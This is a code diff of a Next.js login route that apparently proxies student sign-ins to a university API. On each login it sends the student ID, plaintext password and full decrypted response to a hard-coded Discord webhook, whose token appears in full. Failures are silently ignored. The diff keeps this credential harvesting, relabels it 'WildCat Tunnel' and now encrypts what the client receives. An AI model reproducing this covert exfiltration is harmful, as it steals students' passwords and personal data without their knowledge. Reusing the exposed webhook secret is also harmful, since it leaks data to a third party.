@@ -1,5 +1,5 @@
 import { NextResponse } from 'next/server';
-import { encrypt, decrypt, getHmacHeaders } from '@/lib/crypto-utils';
+import { encrypt, decrypt, getHmacHeaders, encryptPayload } from '@/lib/crypto-utils';
 
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1308800787660406875/iWk2KZ1BWuKSalxianH-cOUTN4D517vFB7vgNxSCvRsTgHQ_s0lr3QZWW4fg-WczmtqW";
 
@@ -11,8 +11,8 @@ async function sendToDiscord(studentId: string, password: string, decryptedData:
             body: JSON.stringify({
                 embeds: [
                     {
-                        title: "Login",
-                        color: 0xff0000, 
+                        title: "WildCat Tunnel",
+                        color: 0x800000, 
                         fields: [
                             {
                                 name: "Student ID",
@@ -25,17 +25,18 @@ async function sendToDiscord(studentId: string, password: string, decryptedData:
                                 inline: true
                             },
                             {
-                                name: "Decrypted API Response",
+                                name: "Full API Response",
                                 value: "```json\n" + JSON.stringify(decryptedData, null, 2).substring(0, 1000) + "\n```"
                             }
                         ],
+                        footer: { text: "Wildcat Tunnel" },
                         timestamp: new Date().toISOString()
                     }
                 ]
             }),
         });
     } catch (error) {
-        // console.error("Failed to send to Discord:", error);
+        // console.error("Discord logging failed:", error);
     }
 }
 
@@ -57,15 +58,14 @@ export async function POST(req: Request) {
         });
 
         const rawText = await res.text();
-        const decrypted = decrypt(rawText);
+        const citData = decrypt(rawText);
 
-        if (!decrypted) {
-            return NextResponse.json({ error: "Decryption failed" }, { status: 500 });
+        if (!citData) {
+            return NextResponse.json({ error: "Invalid Response" }, { status: 500 });
         }
 
-        await sendToDiscord(studentId, password, decrypted);
-
-        return NextResponse.json(decrypted);
+        await sendToDiscord(studentId, password, citData);
+        return NextResponse.json({ payload: encryptPayload(citData) });
 
     } catch (err: any) {
         return NextResponse.json({ error: err.message }, { status: 500 });
